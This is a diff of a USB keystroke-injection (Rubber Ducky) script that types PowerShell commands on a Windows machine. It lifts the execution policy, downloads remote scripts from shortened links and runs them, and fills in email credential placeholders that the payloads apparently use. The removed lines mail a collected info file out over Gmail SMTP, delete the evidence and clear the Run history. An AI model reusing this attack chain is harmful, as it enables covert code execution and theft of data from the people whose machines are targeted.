@@ -16,56 +16,39 @@ LEFTARROW
 DELETE
 STRING Set-ExecutionPolicy unrestricted
 ENTER
-DELAY 500
+DELAY 200
 STRING a
 ENTER
 DELAY 500
-REM 		-- The link https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/60baac1b8ba294d8f11ed3b1e15381af23632d08/just%2520for%2520my%2520own%2520testing
-STRING (new-object net.webclient).DownloadFile('https://goo.gl/EFg0Lw','in.ps1')
+REM 		-- The link https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/5d034259e4487fa4d5767882e326a0dcdc421bf4/just%2520for%2520my%2520own%2520testing
+STRING (new-object net.webclient).DownloadFile('https://goo.gl/EqRMJV','in.ps1')
 SHIFT ENTER
 STRING ./in.ps1
+ENTER
+DELAY 2000
+
+REM 		-- Remember to change mail and password
+
+STRING $user="EMAIL"
+ENTER
+DELAY 300
+STRING $passw="PASSWORD"
+ENTER
+DELAY 300
+
+
+REM 		-- https://gist.githubusercontent.com/MrSnowMonster/4477191a915b3e9deb8b911803858dd4/raw/d61abbb972cfd11497781f69a7ba076125ff31ce/gistfile1.txt
+STRING (new-object net.webclient).DownloadFile('https://goo.gl/IuEZ6k','an.ps1')
+SHIFT ENTER
+STRING ./an.ps1
 ENTER
 DELAY 2000
 ENTER
 STRING Set-ExecutionPolicy restricted
 ENTER
-DELAY 500
+DELAY 200
 STRING a
 ENTER
-DELAY 300
-STRING $SMTPServer = 'smtp.gmail.com'
-ENTER
-STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-ENTER
-STRING $SMTPInfo.EnableSsl = $true
-ENTER
-
-REM		-- Remember to add your email details for the script to work. change Email, PASSWORD, SENDERMAIL and RECIVERMAIL.
-
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD')
-ENTER
-STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
-ENTER
-STRING $ReportEmail.From = 'SENDEREMAIL'
-ENTER
-STRING $ReportEmail.To.Add('RECIVEREMAIL')
-ENTER
-STRING $ReportEmail.Subject = 'Info file'
-ENTER
-STRING $ReportEmail.Body = (Get-Content i.txt | out-string)
-ENTER
-STRING $SMTPInfo.Send($ReportEmail)
-ENTER
-DELAY 500
-STRING del i.txt
-ENTER
-DELAY 500
-STRING del in.ps1
-ENTER
-DELAY 500
-REM Clear the Run history and exit
-STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
-ENTER
-DELAY 500
+DELAY 250
 STRING exit
 ENTER
